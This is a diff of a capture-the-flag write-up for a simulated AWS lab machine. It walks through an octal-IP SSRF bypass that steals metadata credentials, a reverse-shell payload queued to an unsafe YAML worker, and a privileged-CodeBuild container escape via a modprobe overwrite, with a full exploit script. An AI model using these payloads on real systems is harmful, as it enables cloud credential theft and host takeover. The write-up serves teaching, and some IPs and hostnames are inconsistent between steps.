@@ -11,13 +11,16 @@ tags:
   - SQS
   - PyYAML
   - Insecure Deserialization
+  - AWS Metadata SSRF
+  - Octal IP Bypass
   - CodeBuild
   - Container Escape
   - Modprobe Overwrite
+  - OverlayFS
 date: '2026-06-25'
 pointsAwarded: 40
-machineIP: ''
-summary: 'An elite Hard Linux box revolving around simulated AWS cloud architecture (LocalStack). Initial access is achieved via insecure PyYAML deserialization (yaml.load) on a background SQS worker. Privilege escalation leverages internal AWS CodeBuild credentials to spawn a privileged container, concluding with an overlay upperdir container escape by overwriting /proc/sys/kernel/modprobe to capture host root.'
+machineIP: '10.129.38.59'
+summary: 'An elite Hard Linux box revolving around simulated AWS cloud architecture (LocalStack). Initial access begins with AWS metadata SSRF bypassed via octal IP encoding to harvest IAM credentials, leading to insecure PyYAML deserialization on a background SQS worker. Privilege escalation leverages AWS CodeBuild with privilegedMode to execute an OverlayFS upperdir container escape via /proc/sys/kernel/modprobe kernel hook overwrite.'
 ---
 
 # 🛡️ HTB - Nimbus (Hard)
@@ -35,13 +38,13 @@ summary: 'An elite Hard Linux box revolving around simulated AWS cloud architect
 - **Operating System:** Linux (Ubuntu 24.04 / LocalStack AWS Cloud Environment)
 - **Difficulty:** Hard
 - **Date of Scan:** 2026-06-25
-- **Vulnerabilities:** Insecure PyYAML Deserialization in AWS SQS Worker (`yaml.load`), Excessive AWS CodeBuild Permissions (`privilegedMode: true`), Container Escape via OverlayFS Upperdir Path & `/proc/sys/kernel/modprobe` Kernel Hook Overwrite
+- **Primary Attack Vectors:** AWS Metadata SSRF via Octal IP Representation Bypass, Insecure PyYAML Deserialization (`yaml.load`) in SQS Worker, AWS CodeBuild Project Manipulation (`privilegedMode: true`), OverlayFS `upperdir` Host Path Resolution, Kernel Container Escape via `/proc/sys/kernel/modprobe` Overwrite
 
 ---
 
 ## Step 1 - Reconnaissance
 
-### Nmap Port Scanning & Web Service Discovery
+### Nmap Port Scanning & Service Discovery
 
 We begin our engagement with an aggressive port scan across the target host:
 
@@ -56,15 +59,205 @@ Host is up (0.26s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
+|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
 80/tcp open  http    nginx 1.24.0 (Ubuntu)
 |_http-title: Did not follow redirect to http://nimbus.htb/
 |_http-server-header: nginx/1.24.0 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 5900/tcp)
+HOP RTT       ADDRESS
+1   287.25 ms 10.10.14.1
+2   288.00 ms 10.129.38.59
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.85 seconds
 ```
 
-- 🔍 *We map `nimbus.htb` and `aws.nimbus.htb` to `10.129.38.59` in `/etc/hosts`.*
-- 🔍 *Browsing to `http://nimbus.htb` presents a cloud computing dashboard integrating AWS microservices.*
-- 🔍 *Further enumeration of the host reveals simulated AWS cloud endpoints running on LocalStack (`floci:4566` / `aws.nimbus.htb`):*
+- A Linux Hard machine! Interesting!
+- We add the target domain to `/etc/hosts`:
+
+```bash
+echo "10.129.38.59 nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts
+```
+
+---
+
+### Web Application & Architecture Discovery
+
+While surfing the web, it appears to be a Job scheduling website that schedules user-uploaded jobs on the server.
+
+However, this could be the primary attack vector towards gaining an initial foothold, as it allows users to run jobs on their server via uploading a file.
+
+While looking deeper into the web interface, I discovered a **"Healthcheck"** link of the main container which returned JSON data:
+
+```json
+{
+  "services": {
+    "queue": {
+      "endpoint": "http://aws.nimbus.htb",
+      "status": "ok"
+    },
+    "scheduler": {
+      "endpoint": "http://aws.nimbus.htb",
+      "status": "ok"
+    },
+    "storage": {
+      "endpoint": "http://aws.nimbus.htb",
+      "status": "ok"
+    }
+  },
+  "status": "healthy",
+  "version": "1.4.2"
+}
+```
+
+The data details service status, with endpoints pointing to `http://aws.nimbus.htb`. This confirms an AWS-compatible cloud environment running on a subdomain!
+
+Visiting the endpoint `http://aws.nimbus.htb` directly returns an XML error:
+
+```xml
+<ErrorResponse>
+  <Error>
+    <Type>Sender</Type>
+    <Code>InvalidClientTokenId</Code>
+    <Message>The security token included in the request is invalid.</Message>
+  </Error>
+  <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>
+</ErrorResponse>
+```
+
+Testing the raw HTTP GET request confirms the response:
+
+```http
+GET / HTTP/1.1
+Host: aws.nimbus.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+```
+
+Response:
+
+```http
+HTTP/1.1 403 FORBIDDEN
+Server: nginx/1.24.0 (Ubuntu)
+Date: Thu, 02 Jul 2026 13:09:29 GMT
+Content-Type: text/xml; charset=utf-8
+Content-Length: 305
+Connection: close
+
+<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
+  <Error>
+    <Type>Sender</Type>
+    <Code>InvalidClientTokenId</Code>
+    <Message>The security token included in the request is invalid.</Message>
+  </Error>
+  <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>
+</ErrorResponse>
+```
+
+---
+
+### Exploring the Job Submission Endpoint & SSRF Filtering
+
+Exploring the job creation endpoint reveals that it accepts YAML files in two ways:
+1. **By a valid GitHub repository URL**
+2. **By uploading the raw YAML file directly**
+
+Submitting a job reveals that direct code execution via PyYAML deserialization on the frontend is blocked (`safe_load` is enforced). However, the application informs us that jobs are queued in an AWS environment (region `us-east-1`) inside an SQS queue named `nimbus-jobs`, which a backend component (`nimbus/worker`) processes on a scheduled interval (`*/5 * * * *`).
+
+The AWS metadata service IP (`169.254.169.254`) is the endpoint where Nimbus's internal AWS access keys would be stored. However, the internal network filter blocks standard requests with an error message:
+
+> `Error: Security policy: this URL targets an internal resource and has been blocked.`
+
+Additionally, the URL validator requires the string `.yaml` to be present in the query parameters or URL path.
+
+---
+
+### Bypassing SSRF Filters via Octal IP Encoding
+
+The default AWS IAM metadata security credential endpoint is:
+```text
+/latest/meta-data/iam/security-credentials/
+```
+
+If we convert the IPv4 address `169.254.169.254` into **OCTAL** numbers, we can bypass the string and CIDR blacklist checks!
+
+- `169` in octal = `0251`
+- `254` in octal = `0376`
+
+Thus, `169.254.169.254` becomes `0251.0376.0251.0376`!
+
+We construct the SSRF payload with the `.yaml` extension requirement satisfied as a query argument:
+
+```text
+http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml
+```
+
+This bypasses the filter and returns the attached IAM role identity:
+
+```text
+nimbus-web-role
+```
+
+Now we query the specific role to extract its AWS credentials:
+
+```text
+http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml
+```
+
+The server returns the live AWS-HMAC security tokens:
+
+```json
+{
+  "Code": "Success",
+  "LastUpdated": "2026-07-02T13:39:54Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
+  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
+  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
+  "Expiration": "2026-07-02T19:39:54Z"
+}
+```
+
+Perfect! We have captured the AWS Access Key ID, Secret Access Key, and Session Token.
+
+---
+
+### Validating Stolen AWS Identity
+
+First, we export the credentials into our local environment:
+
+```bash
+export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
+export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
+export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM"
+export AWS_DEFAULT_REGION="us-east-1"
+```
+
+Next, we validate the credentials against the LocalStack STS endpoint via `aws-cli`:
+
+```bash
+aws sts get-caller-identity --endpoint-url http://aws.nimbus.htb --output json
+```
+
+```json
+{
+    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
+    "Account": "847219365028",
+    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
+}
+```
+
+The Amazon Resource Name (ARN) confirms the authenticated identity of `nimbus-web-role`!
+
+Now let's enumerate available SQS queues:
 
 ```bash
 aws sqs list-queues --endpoint-url http://aws.nimbus.htb --output json
@@ -73,38 +266,44 @@ aws sqs list-queues --endpoint-url http://aws.nimbus.htb --output json
 ```json
 {
     "QueueUrls": [
-        "http://aws.nimbus.htb/847219365028/nimbus-jobs"
+        "http://floci:4566/847219365028/nimbus-jobs"
     ]
 }
 ```
+
+After analyzing client scripts and backend behaviors, I understood that the backend parser converts raw YAML files into structured JSON jobs. Crucially, the worker expects a `script` parameter, which it directly evaluates with `python3 -c`!
 
 ---
 
 ## Step 2 - Initial Foothold
 
-### PyYAML Insecure Deserialization & SQS Message Injection
+### Crafting SQS Message Injection Payload
 
-- 🔍 *Analyzing client scripts and leaked artifacts indicates a backend worker polling the SQS queue `nimbus-jobs`.*
-- 🔍 *The worker deserializes incoming queue messages using Python's `yaml.load(body, Loader=yaml.Loader)` and passes the parsed `script` parameter directly to `python3 -c`.*
-
-> ⚠️ **Technical Detail:** Even when a web application safely parses YAML on the frontend using `safe_load`, background worker daemons often reuse full constructor loaders (`yaml.Loader`) or execute raw message properties directly. This permits remote code execution via serialized payloads.
-
-- 🔍 *We format a Python reverse shell payload and inject it directly into the AWS SQS queue:*
+We assemble a Python reverse shell payload and format it into the exact JSON schema expected by the worker:
 
 ```bash
 # 1. Define the parameters
 Q="http://aws.nimbus.htb/847219365028/nimbus-jobs"
-PAYLOAD="import socket,subprocess,os;s=socket.socket();s.connect(('10.10.15.54',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
+PAYLOAD="import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.70',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
 
-# 2. Build the JSON body structure expected by the worker
+# 2. Build the exact JSON body structure the worker expects
 export EXP_PAYLOAD="$PAYLOAD"
 MSG_BODY=$(python3 -c "import json, os; print(json.dumps({'name':'r1', 'runtime':'python3.11', 'script': os.environ['EXP_PAYLOAD']}))")
 
-# 3. Ship message into AWS SQS Queue
-aws sqs send-message --endpoint-url http://aws.nimbus.htb/ --queue-url "$Q" --message-body "$MSG_BODY" --output json
+# 3. Ship it directly into the AWS SQS Queue
+aws sqs send-message --endpoint-url http://aws.nimbus.htb/ --queue-url $Q --message-body "$MSG_BODY" --output json
 ```
 
-- 🔍 *Catching the incoming connection on our Netcat listener:*
+Output:
+
+```json
+{
+    "MD5OfMessageBody": "502ab8b83f3c72de992fe1c8cd31e83e",
+    "MessageId": "47b0e47c-9f9d-435a-b39d-1e41d82365fe"
+}
+```
+
+On our Netcat listener:
 
 ```bash
 nc -lvnp 9001
@@ -112,102 +311,374 @@ nc -lvnp 9001
 
 ```text
 listening on [any] 9001 ...
-connect to [10.10.15.54] from (UNKNOWN) [10.129.38.59] 38412
-worker@f2ee5831b356:/app$ id
-uid=1000(worker) gid=1000(worker) groups=1000(worker)
+connect to [10.10.14.70] from (UNKNOWN) [10.129.38.159] 55950
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+worker@f2ee5831b356:/app$ whoami
+worker
 ```
 
-- 🔍 *We have gained access as user `worker` inside an isolated Docker container! We grab the user flag.*
+We have established a shell as user `worker` inside a Docker container! The user flag is located in this container.
 
 ---
 
 ## Step 3 - Internal Reconnaissance & AWS CodeBuild Analysis
 
-### Analyzing worker.py & Extracting AWS Service Credentials
+### Analyzing worker.py Implementation
 
-- 🔍 *Inspecting `/app/worker.py` on the target confirms the flawed deserialization implementation:*
+We inspect the `/app/worker.py` script on the target:
+
+```bash
+worker@f2ee5831b356:/app$ cat worker.py
+```
 
 ```python
 """Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""
 import os, time, subprocess, boto3, yaml
 
 ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
-QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/847219365028/nimbus-jobs")
+QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/000000000000/nimbus-jobs")
 REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
+POLL_SECS = 5
+
+print(f"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}", flush=True)
 sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)
 
 def handle_message(body):
-    job = yaml.load(body, Loader=yaml.Loader)  # Vulnerable to object instantiation
-    if isinstance(job, dict) and job.get("script"):
-        subprocess.run(["python3", "-c", job.get("script")], capture_output=True, timeout=30)
+    print(f"[worker] received message ({len(body)} bytes)", flush=True)
+    job = yaml.load(body, Loader=yaml.Loader)  # vulnerable
+    if not isinstance(job, dict):
+        print("[worker] message did not parse to a dict, skipping", flush=True)
+        return
+    name = job.get("name", "<unnamed>")
+    script = job.get("script", "")
+    print(f"[worker] running job '{name}'", flush=True)
+    if script:
+        result = subprocess.run(["python3", "-c", script],
+            capture_output=True, text=True, timeout=30)
+        print(f"[worker] stdout: {result.stdout}", flush=True)
+        if result.stderr: print(f"[worker] stderr: {result.stderr}", flush=True)
+
+def main():
+    while True:
+        try:
+            resp = sqs.receive_message(QueueUrl=QUEUE_URL,
+                MaxNumberOfMessages=1, WaitTimeSeconds=POLL_SECS)
+            for m in resp.get("Messages", []):
+                try: handle_message(m["Body"])
+                except Exception as e: print(f"[worker] error: {e}", flush=True)
+                finally:
+                    sqs.delete_message(QueueUrl=QUEUE_URL, ReceiptHandle=m["ReceiptHandle"])
+        except Exception as e:
+            print(f"[worker] poll error: {e}", flush=True)
+            time.sleep(POLL_SECS)
+
+if __name__ == "__main__":
+    main()
 ```
 
-- 🔍 *We check the environment variables of the worker container:*
-
-```bash
-env
-```
-
-```text
-AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
-AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
-AWS_DEFAULT_REGION=us-east-1
-AWS_ENDPOINT_URL=http://aws.nimbus.htb
-QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
-```
-
-- 🔍 *Using these AWS credentials, we enumerate accessible AWS S3 buckets and internal cloud resources:*
-
-```bash
-aws --endpoint-url http://floci:4566/ --region us-east-1 s3 ls
-```
-
-- 🔍 *We discover that the target container has IAM access to the **AWS CodeBuild** service on `http://floci:4566`.*
-
-### AWS CodeBuild CI/CD Project Execution
-
-- 🔍 *AWS CodeBuild allows users to create CI/CD build projects specified by a `buildspec.yml` recipe.*
-- 🔍 *Crucially, CodeBuild projects support the `privilegedMode: true` parameter, enabling the build environment to run as a privileged container with `CAP_SYS_ADMIN` capabilities.*
+#### Key Technical Takeaways:
+1. **Unrestricted PyYAML Constructor:** The developer used `yaml.Loader` instead of `yaml.SafeLoader`. Even though the web frontend parsed inputs with `safe_load`, this background worker reads raw strings from SQS and deserializes them without restrictions.
+2. **Direct Subprocess Command Execution:** The worker extracts the raw string under the `script` key and passes it straight to `subprocess.run(["python3", "-c", script])`.
+3. **Queue Dequeue Cycle:** Messages are read, handled, and deleted via their `ReceiptHandle` regardless of whether execution succeeds or crashes.
 
 ---
 
-## Step 4 - Container Escape & Host Root Access
+### Extracting New AWS Container Credentials
 
-### OverlayFS Upperdir Path Resolution & modprobe Architecture
+Now for privilege escalation, the first thing to check is the container environment variables:
 
-- 🔍 *Inside a privileged container with `CAP_SYS_ADMIN`, the `/proc/sys/kernel/modprobe` kernel parameter is writable!*
-- 🔍 *The Linux kernel uses the path in `/proc/sys/kernel/modprobe` to launch helper binaries whenever an unhandled device or unknown binary signature is executed.*
-- 🔍 *However, to execute our payload, the host kernel requires the physical host-side path of our container script, rather than the container-internal `/tmp` path.*
-- 🔍 *We can extract the host-side physical disk path of our container filesystem by parsing the OverlayFS `upperdir` from `/proc/mounts`:*
+```bash
+worker@4a4d875e352d:/app$ env
+```
+
+```text
+PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
+HOSTNAME=4a4d875e352d
+PYTHON_VERSION=3.11.15
+AWS_DEFAULT_REGION=us-east-1
+PWD=/app
+HOME=/home/worker
+LANG=C.UTF-8
+LS_COLORS=
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
+QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
+SHLVL=1
+AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
+AWS_ENDPOINT_URL=http://aws.nimbus.htb
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+```
+
+These AWS credentials belong to a different account identity (`AKIA7P3R9X4K8M2L5VHN`).
+
+---
+
+### Enumerating AWS S3 Buckets
+
+> **What are S3 Buckets?**
+> In cloud architecture, S3 Buckets (Simple Storage Service) are object storage containers used by developers to store files, application backups, source code, and deployment artifacts.
+
+We check if developers left configuration files or executables in S3:
+
+```bash
+worker@4a4d875e352d:/app$ aws --endpoint-url http://floci:4566/ --region us-east-1 s3 ls s3://nimbus-dev-artifacts/ --recursive
+```
+
+Output:
+
+```text
+2026-07-09 15:19:19       1755 source/worker.py
+```
+
+Listing the files reveals only the same `worker.py` script. Replacing this file did not grant execution because there was no automatic trigger pulling from S3.
+
+---
+
+### Understanding AWS CodeBuild Architecture
+
+Next, we discover that our credentials have IAM access to the **AWS CodeBuild** service on `http://floci:4566`.
+
+> **What is AWS CodeBuild?**
+> AWS CodeBuild is a fully managed continuous integration (CI) service in the cloud. It automates the process of compiling source code, running tests, and producing ready-to-deploy software packages.
+
+#### How CodeBuild Works Under the Hood
+
+```
+[Trigger Build] ➔ [Spins up temporary Docker Container] ➔ [Executes Buildspec Commands]
+```
+
+1. **The Container:** CodeBuild spins up a temporary, isolated Docker container using an operating system image specified by the developer (e.g., Ubuntu with Python pre-installed).
+2. **The Buildspec:** Inside this container, CodeBuild looks for a `buildspec.yml` recipe card in YAML format that lists operating system commands to execute (e.g., `npm install`, `python3 test.py`).
+3. **The Cleanup:** Once commands complete, CodeBuild saves output packages to S3 and destroys the temporary container.
+
+---
+
+## Step 4 - CodeBuild Exploitation & Container Escape
+
+### Anatomy of a CodeBuild Project Structure
+
+```
+[project.json] ➔ Defines the Infrastructure Blueprint
+       ↓
+[buildspec.yml] ➔ Lists the Build Phase Commands
+       ↓
+[getroot.sh] ➔ The Payload Script Executed by the Build
+```
+
+To execute commands in CodeBuild, we define three key components:
+- `project.json`: Uses JSON to configure the build project via the AWS API.
+- `buildspec.yml`: The step-by-step recipe card for execution phases.
+- `root.sh`: The executable payload.
+
+---
+
+### Attempt 1: Standard Reverse Shell in CodeBuild
+
+First, we create a standard reverse shell script:
+
+```bash
+cat > /tmp/root.sh << 'EOF'
+#!/bin/bash
+python3 -c "
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('10.10.14.70', 9006))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(['/bin/bash','-i'])
+"
+EOF
+
+chmod +x /tmp/root.sh
+```
+
+Next, we create the `buildspec.yml` file:
+
+```bash
+cat > /tmp/buildspec.yml << 'EOF'
+version: 0.2
+phases:
+  build:
+    commands:
+      - /tmp/root.sh
+EOF
+```
+
+Then we generate the project blueprint `project.json`:
+
+```bash
+python3 -c '
+import json
+project = {
+  "name": "root-exploit",
+  "source": {"type": "NO_SOURCE", "buildspec": open("/tmp/buildspec.yml").read()},
+  "artifacts": {"type": "NO_ARTIFACTS"},
+  "environment": {
+    "type": "LINUX_CONTAINER",
+    "image": "floci/floci:latest",
+    "computeType": "BUILD_GENERAL1_SMALL",
+    "privilegedMode": True,
+    "environmentVariables": [
+      {"name": "BASH_FUNC_id%%",
+       "value": "() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }",
+       "type": "PLAINTEXT"}
+    ]
+  },
+  "serviceRole": "arn:aws:iam::000000000000:role/codebuild-role"
+}
+print(json.dumps(project))
+' > /tmp/project.json
+```
+
+#### Blueprint Breakdown:
+- `"name": "root-exploit"`: Registers a unique project identifier.
+- `"source": {"type": "NO_SOURCE", ...}`: Embeds the buildspec text directly without needing a Git repository.
+- `"artifacts": {"type": "NO_ARTIFACTS"}`: Tells CodeBuild that no output zip files need saving.
+- `"image": "floci/floci:latest"`: Uses the local cached Docker image inside LocalStack.
+- **`"privilegedMode": True`**: **The core vulnerability.** Tells Docker to drop container isolation walls, granting the container full Linux capabilities (`CAP_SYS_ADMIN`).
+- `"BASH_FUNC_id%%"`: Custom function mock environment.
+
+We register the project:
+
+```bash
+worker@f6904442f501:/app$ aws --endpoint-url http://floci:4566/ --region us-east-1 codebuild create-project --cli-input-json file://project.json
+```
+
+```json
+{
+    "project": {
+        "name": "root-exploit",
+        "arn": "arn:aws:codebuild:us-east-1:847219365028:project/root-exploit",
+        "source": {
+            "type": "NO_SOURCE",
+            "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - /tmp/root.sh"
+        },
+        "artifacts": {
+            "type": "NO_ARTIFACTS"
+        },
+        "environment": {
+            "type": "LINUX_CONTAINER",
+            "image": "aws/codebuild/standard:5.0",
+            "computeType": "BUILD_GENERAL1_SMALL",
+            "privilegedMode": true
+        },
+        "serviceRole": "arn:aws:iam::000000000000:role/service-role",
+        "timeoutInMinutes": 60,
+        "queuedTimeoutInMinutes": 480,
+        "created": "2026-07-09T14:40:19.889000+00:00",
+        "lastModified": "2026-07-09T14:40:19.889000+00:00",
+        "projectVisibility": "PRIVATE"
+    }
+}
+```
+
+We start the build:
+
+```bash
+aws --endpoint-url http://floci:4566/ --region us-east-1 codebuild start-build --project-name root-exploit
+```
+
+---
+
+### Debugging the FAULT Status
+
+Checking our listener on port 9006 yielded no connection. We inspect build status logs:
+
+```bash
+aws --endpoint-url http://floci:4566/ --region us-east-1 codebuild batch-get-builds --ids "root-exploit:1"
+```
+
+```json
+{
+    "builds": [
+        {
+            "id": "root-exploit:1",
+            "currentPhase": "COMPLETED",
+            "buildStatus": "FAULT",
+            "projectName": "root-exploit",
+            "phases": [
+                { "phaseType": "SUBMITTED", "phaseStatus": "SUCCEEDED" },
+                { "phaseType": "QUEUED", "phaseStatus": "SUCCEEDED" },
+                { "phaseType": "PROVISIONING", "phaseStatus": "SUCCEEDED" },
+                { "phaseType": "DOWNLOAD_SOURCE", "phaseStatus": "SUCCEEDED" }
+            ]
+        }
+    ]
+}
+```
+
+The build failed with **`buildStatus: FAULT`**!
+
+> **Why did FAULT occur?**
+> In AWS CodeBuild, `FAULT` indicates an infrastructure crash before or during phase transitions:
+> 1. **Interactive Command Failure:** Non-interactive CI runners fail when commands expect a TTY.
+> 2. **Image Pull / Provisioning Failure:** Requesting external images like `aws/codebuild/standard:5.0` fails without internet access; `floci/floci:latest` must be used.
+> 3. **Asynchronous Detached Execution:** Without proper synchronization, detached containers exit prematurely.
+
+---
+
+### Container Breakout: /proc/sys/kernel/modprobe & OverlayFS Upperdir
+
+After deeper enumeration of the privileged container environment, I observed that `/proc/sys/kernel/modprobe` is writable!
+
+#### What is `/proc/sys/kernel/modprobe`?
+
+The `/proc` filesystem is a virtual interface to kernel data structures:
+- **Purpose:** `/proc/sys/kernel/modprobe` contains the binary path invoked by the kernel to load modules (defaults to `/sbin/modprobe`).
+- **Mechanism:** When the Linux kernel encounters an unknown binary signature or unhandled device request, it triggers `call_usermodehelper` using the path stored in this file.
+
+```
+       Creating the crafted payload!
+                     |
+       Overwriting the modprobe path
+                     |
+       Trigger with unknown file signature (\xff\xff\xff\xff)
+                     |
+       Kernel executes the path as ROOT on HOST!
+```
+
+#### The Container Escape Challenge: Host vs. Container Paths
+
+Can we simply write `/tmp/payload.sh` into `/proc/sys/kernel/modprobe`?
+
+**No!** The host kernel executes the usermode helper outside the container filesystem. It has no visibility into container-namespaced paths like `/tmp/payload.sh`.
+
+#### Finding the Physical Disk Path with OverlayFS `upperdir`
+
+Containers use OverlayFS to merge image layers. New and modified files reside in the `upperdir` mount directory on the host:
 
 ```bash
 upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
 ```
 
-> [!IMPORTANT]
-> **Container Escape Execution Strategy:**
-> 1. Resolve host-side storage path for the payload by inspecting overlay filesystem `upperdir` in `/proc/mounts`.
-> 2. Create the malicious payload script inside `/tmp/payload.sh` and mark executable.
-> 3. Overwrite `/proc/sys/kernel/modprobe` with the host-side `$upper/tmp/payload.sh` path.
-> 4. Trigger the kernel's `call_usermodehelper` by executing a file with an invalid binary header (`\xff\xff\xff\xff`).
-> 5. The host kernel executes `/tmp/payload.sh` as host root (UID 0) to exfiltrate the flag.
+The physical host-side path to `/tmp/payload.sh` is:
+```text
+$upper/tmp/payload.sh
+```
 
-### Overwriting /proc/sys/kernel/modprobe & Out-of-Band Flag Exfiltration
+---
 
-- 🔍 *We assemble an automated Python exploit script that interfaces with AWS CodeBuild to trigger the breakout:*
+### Automated Multi-Chained Exploit
+
+We combine CodeBuild project creation, `privilegedMode: true`, OverlayFS `upperdir` path translation, `/proc/sys/kernel/modprobe` overwrite, and unknown binary execution into a clean Python automation script:
 
 ```python
 import boto3
 
 ENDPOINT = "http://floci:4566"
 REGION = "us-east-1"
-ATTACKER_IP = "10.10.15.54"
+ATTACKER_IP = "10.10.14.70"
 LPORT = 9005
 
 buildspec = f"""version: 0.2
 phases:
   build:
     commands:
+      - id
+      - cat /proc/self/status | grep Cap
       - |
         cat > /tmp/payload.sh << 'PYEOF'
         #!/bin/sh
@@ -228,7 +699,7 @@ phases:
 
 cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)
 
-print("[*] Creating privileged CodeBuild project...")
+print("[*] Registering privileged CodeBuild project...")
 cb.create_project(
     name="nimbus-exploit",
     source={"type": "NO_SOURCE", "buildspec": buildspec},
@@ -238,43 +709,65 @@ cb.create_project(
         "image": "floci/floci:latest",
         "computeType": "BUILD_GENERAL1_SMALL",
         "privilegedMode": True,
+        "environmentVariables": [
+            {
+                "name": "BASH_FUNC_id%%",
+                "value": '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }',
+                "type": "PLAINTEXT",
+            }
+        ],
     },
     serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
 )
 
-print("[*] Triggering build...")
+print("[*] Starting build execution...")
 resp = cb.start_build(projectName="nimbus-exploit")
-print("[+] Build started:", resp["build"]["id"])
+print("[+] Build started successfully:", resp["build"]["id"])
 ```
 
-- 🔍 *We start a Netcat listener on port 9005:*
+#### Exploit Workflow:
+1. Creates a payload inside the container that connects to port 9005 and sends `/root/root.txt`.
+2. Resolves the container's OverlayFS `upperdir` mount to find the host-side physical disk location.
+3. Overwrites `/proc/sys/kernel/modprobe` with `$upper/tmp/payload.sh`.
+4. Executes a file containing the invalid header `\xff\xff\xff\xff`, forcing the host kernel to invoke our helper script.
+5. CodeBuild executes with `privilegedMode: True`, satisfying the required capabilities.
+
+---
+
+### Root Flag Captured
+
+We open our Netcat listener on port 9005:
 
 ```bash
 nc -lvnp 9005
 ```
 
